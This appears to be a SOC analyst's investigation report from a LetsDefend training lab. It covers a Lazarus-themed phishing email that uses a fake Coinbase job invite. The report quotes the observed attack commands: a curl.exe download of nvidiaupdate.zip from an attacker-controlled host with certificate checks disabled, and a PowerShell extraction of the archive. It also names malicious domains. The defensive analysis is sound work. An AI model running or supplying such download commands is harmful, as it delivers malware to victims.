---
layout: default
title: Lazarus Phishing Campaign
parent: Investigations
nav_order: 2
---

# SOC Investigation Report: Phishing Alert

## Alert Details

- **Alert:** SOC337 - Lazarus Phishing Campaign Detected (APT38)
- **Alert ID:** 315
- **Affected User:** Ellen
- **Incident Type:** Phishing / Suspected Malware Delivery
- **Verdict:** True Positive

## Summary

The alert was triggered by a suspicious email sent to Ellen with the subject *Invitation: Coinbase Crypto Trader Hiring Assessment*. The email contained a link to `blockchainjobhub.com`, which was identified as malicious during threat intelligence analysis.

The email was allowed through the security control and delivered to the recipient. The LetsDefend playbook recorded that the user accessed the malicious URL and that a file was downloaded and opened.

Further investigation identified `curl.exe` downloading a file named `nvidiaupdate.zip` from `api.drivercams.cloud`. Sysmon logs also showed PowerShell extracting the archive into `C:\Users\LetsDefend\nvidiadrive`.

VirusTotal reported 15 detections out of 98 for the download URL, with classifications including Trojan and Downloader.

## Investigation Findings

### Email Analysis

The email contained a suspicious hyperlink directing the recipient to:

`https://blockchainjobhub.com/invite/E3fM8yF7`

The URL was identified as malicious through threat intelligence checks.

### Delivery and User Activity

The email security alert recorded the message as allowed. The LetsDefend playbook indicated that the recipient accessed the malicious URL and downloaded and opened a file.

### Endpoint Activity

Process logs showed `curl.exe` downloading `nvidiaupdate.zip`, followed by PowerShell extracting the archive into the user's directory.

The download command was:

```powershell
curl.exe -k -o "C:\Users\LetsDefend\nvidiaupdate.zip" https://api.drivercams.cloud/nvidia-al.update
```

The `-k` option disables TLS certificate verification. Although this is not inherently malicious, it is worth noting in the context of the other suspicious activity.

Sysmon Event ID 1 recorded PowerShell executing the following command at approximately 00:25:26 UTC on 7 March 2025:

```powershell
Expand-Archive -Force -Path 'C:\Users\LetsDefend\nvidiaupdate.zip' -DestinationPath 'C:\Users\LetsDefend\nvidiadrive'
```

This confirms that PowerShell was instructed to extract the archive. The available process-creation event does not independently confirm that any extracted files were subsequently executed.

### Threat Intelligence

VirusTotal flagged the download URL, with 15 out of 98 security vendors detecting it as malicious. Reported classifications included Trojan and Downloader.

The alert referenced Lazarus Group (APT38), but the evidence reviewed does not independently establish attribution to this group.

### Email Header Analysis

The `From` and `Return-Path` fields matched in the EML file. However, matching these fields does not rule out a malicious sender or establish the sender's identity.

## MITRE ATT&CK

- **T1566 - Phishing:** Relevant to the suspicious email.
- **T1105 - Ingress Tool Transfer:** Consistent with the observed file download.
- **T1059.001 - PowerShell:** PowerShell was used to extract the downloaded archive.

These techniques describe behaviours relevant to the investigation and do not independently establish that every technique was successfully used by an attacker.

## Assessment

The alert is classified as a **True Positive** because the investigation identified a malicious URL and suspicious download and extraction activity consistent with malware delivery.

The available evidence does not independently confirm whether the extracted payload was executed, whether persistence was established, or whether data was compromised.

The full extent of the potential compromise remains undetermined.

## Recommended Actions

- Remove the phishing email from the recipient's mailbox if it remains present.
- Investigate the downloaded archive and its extracted contents.
- Review endpoint logs for further execution, persistence, and suspicious network connections.
- Block confirmed malicious URLs and domains through the appropriate security controls.
- Contain the endpoint if further investigation indicates active compromise.

## Conclusion

The investigation identified a malicious phishing URL and subsequent endpoint activity involving a suspicious file download and PowerShell archive extraction.

The evidence supports the True Positive classification and is consistent with malware delivery. Further investigation would be required to determine whether the downloaded payload was executed and to establish the full impact on the endpoint.

Attribution to Lazarus Group remains unconfirmed.
